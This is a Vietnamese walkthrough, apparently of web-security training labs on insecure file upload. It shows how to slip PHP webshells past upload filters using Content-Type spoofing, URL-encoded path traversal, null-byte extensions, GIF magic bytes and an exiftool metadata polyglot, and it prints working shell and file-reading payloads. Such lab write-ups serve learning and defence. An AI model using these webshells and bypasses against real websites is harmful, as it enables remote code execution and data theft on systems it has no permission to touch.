# Lab 01

<img width="1059" height="408" alt="image" src="https://github.com/user-attachments/assets/f9926029-18bc-4ccc-98a3-bd5e5f18ba9d" />

\- Với mô tả và đề bài như trên, ứng dụng cho phép upload file mà không hề có validation → có thể upload file PHP độc hại

***Cách 1:*** Sử dụng hàm `file_get_contents` nhằm trích xuất trực tiếp nội dung file:

\- Tại chức năng tải ảnh đại diện, thực hiện upload một file bất kì vào

\- Sửa extension thành `.php`, `.phtml`, ... với nội dung file:

```
<?php
echo file_get_contents('/home/carlos/secret');
?>
```
\- Gửi file lên một lần nữa, quay trở về trang trước đó, Burp đã bắt được gói tin để load ảnh đại diện

  <img width="1565" height="293" alt="image" src="https://github.com/user-attachments/assets/547e0a64-fe11-4a12-b19c-381d7e277150" />

***Cách 2:*** Sử dụng lệnh thực thi PHP, RCE thông qua một biến do ta kiểm soát

\- Thực hiện tải ảnh, sửa extension với nội dung file:
```
<?php
system($_REQUEST['cmd']);
?>
```

\- Truy cập endpoint mà server tải ảnh lên và lấy secret

<img width="1605" height="171" alt="image" src="https://github.com/user-attachments/assets/39ddf973-36a7-45b3-93f1-196cea3ec059" />

# Lab 02
<img width="1048" height="462" alt="image" src="https://github.com/user-attachments/assets/e74f8a35-1144-402f-b468-b63da24f15c5" />

\- Sau khi tải trực tiếp một file với extension `.php` thì lập tức trả về
```
Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
```
- Khi kiểm tra Content-Type của request, ta nhận được giá trị `application/octet-stream`

\- Sửa Content-Type của request thành `image/png` hoặc `image/jpeg`

\- Sửa nội dung của request:

```
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

\- Back về trang ban đầu, đọc request tải ảnh từ server, ta có được secret:
<img width="1528" height="271" alt="image" src="https://github.com/user-attachments/assets/ac32103a-394e-44a6-8224-bcb04b3f611a" />

# Lab 03
<img width="1043" height="407" alt="image" src="https://github.com/user-attachments/assets/bfa4e50e-8461-4af5-865f-83fad8a18500" />

\- Thực hiện tải webshell với body chứa hàm thực thi `system()`

\- Khi quay lại trang trước đó, ta nhận thấy request tải ảnh đại diện không thực thi, chỉ trả ra plaintext:
<img width="1498" height="265" alt="image" src="https://github.com/user-attachments/assets/d4981f77-ce34-4af4-8637-cebd8abc304f" />
- Chứng tỏ, endpoint này không thực thi lệnh PHP

\- Dựa vào mô tả của lab, ta sẽ đặt biến `filename="../a.php"` nhằm thoát khỏi thư mục upload mặc định, ghi webshell vào nơi có thể thực thi PHP
- Nhận trên thông báo "The file avatars/abc.php has been uploaded."
- Nếu ta tải webshell với `filename` như trên, file thực thi sẽ nằm ở `/files/avatars/../abc.php` = `/files/abc.php`

\- Khi truy cập endpoint `/files/abc.php`, website trả ra lỗi 404, chứng tỏ file không hề được tải lên. Thử với `/avatars/abc.php` cũng không thành công
- Có vẻ như lab đã thêm một lớp filter không cho phép `../` trong tên file

\- Thực hiện URL decode dấu slash &rarr; %2f &rarr; `filename=..%2fabc.php`
- Nhận được thông báo "The file avatars/../abc.php has been uploaded.", chứng tỏ đã khai thác thành công

\- Vào lại endpoint `/files/abc.php` và nhận kết quả
> wn62nn8plod9I4cToSsLAmcWjnFEVc13

# Lab 05
<img width="1044" height="399" alt="image" src="https://github.com/user-attachments/assets/0367485a-e82a-46c2-bcaa-977724b4b5fc" />

\- Mô tả của lab là làm rối file extension, nhưng ta vẫn nên check một lượt các extension có thể thực thi webshell:

<img width="774" height="618" alt="image" src="https://github.com/user-attachments/assets/31d5d8d7-06fe-4772-bf64-9b5e6a20eaa3" />
- Rõ ràng server đã whitelist extension, dường như chỉ cho phép `.png`, `.jpeg`, `.jpg` được pháp tải lên

\- Đến đây, thực hiện obfuscate file extension: `.php.png` và thành công bypass bộ lọc, tải được webshell

\- Nhưng truy cập vào request tải ảnh, code PHP hiện lên ở dạng plaintext &rarr; code không được server thực thi
- Ta thử đảo ngược extensions `.png.php` thì bị từ chối thẳng thừng
- Thử `.pHp`, `.PhP` cũng không thành công
- Semicolon character: `.php%3B.jpg` &rarr; ❌

\- Việc code không thực thi có thể là do file extension là file ảnh, ta cần làm cách nào để qua bypass bằng cách
- Có extension hợp lệ `.jpg`, `.png`
- Nhưng khi server tải ảnh thì thực thi PHP

$\implies$ Null-bytes (`%00` &rarr; `\x00`) 
- Nhằm cắt chuỗi xử lí ở level thấp

\- Với `filename="a.php%00.jpg"`, ta nhận được "The file avatars/a.php has been uploaded." &rarr; bypass thành công

\- Truy cập `/files/avatars/a.php` và thực hiện RCE:

<img width="1606" height="165" alt="image" src="https://github.com/user-attachments/assets/6ca60d34-b424-4237-877e-06896af02a9c" />


***LOGIC BACKEND***

\- Kiểm tra: `a.php%00.jpg` → thấy `.jpg` → cho qua

\- Xử lý: `a.php\0.jpg` → bị cắt thành `a.php`

# Lab 06

<img width="1039" height="454" alt="image" src="https://github.com/user-attachments/assets/0b9e04c8-b8f6-41a4-bab3-fee64cddee5f" />

\- Backend kiểm tra đây có phải file ảnh thật hay không bằng cách:
- Xem các bytes đầu của ảnh
- Xem các bytes cuối của ảnh
- Kiểm tra kích thước của ảnh

***CÁCH 1***

\- Sử dụng magic bytes của file ảnh GIF, rất hay được sử dụng để khai thác dạng bài này: `GIF89a`

\- Tên file vẫn là `.php`, với nội dung file:
```
GIF89a

<?php
system($_REQUEST['cmd']);
?>
```

\- Truy cập vào request dùng để fetch tài nguyên từ server, thực hiện RCE: 

<img width="1542" height="344" alt="image" src="https://github.com/user-attachments/assets/0ff418bc-b7a9-4fd6-bb90-1fc67c8fa945" />

***CÁCH 2***

\- Khi đọc docs về cách khai thác dạng bài này, ta còn một cách là sử dụng Exiftool để cho payload vào trong ảnh khá là hay
- Dùng để đọc / chỉnh sửa metadata của file (đặc biệt là ảnh)

\- Cài đặt:

```
$ sudo apt update
$ sudo apt install libimage-exiftool-perl
```

\- Từ đây, ta tạo một polyglot file (1 file có nhiều định dạng cùng lúc)
```
exiftool -Comment="<?php system($_REQUEST['cmd']); ?>" abc.jpg
```
<img width="772" height="532" alt="image" src="https://github.com/user-attachments/assets/a7b2c49e-19ac-4dc7-9452-404d774fd2a2" />

\- Upload ảnh lên web, chuyển extension thành `.php`, khi này server sẽ in binary rác ra trước, rồi thực thi code qua biến `cmd`

<img width="794" height="175" alt="image" src="https://github.com/user-attachments/assets/62da3c1f-3013-44b3-b6fa-03cbecf12635" />

- Vì binary rác quá nhiều, ta cần đánh dấu secret kẹp giữa "START" và "END" để tường minh hơn

 









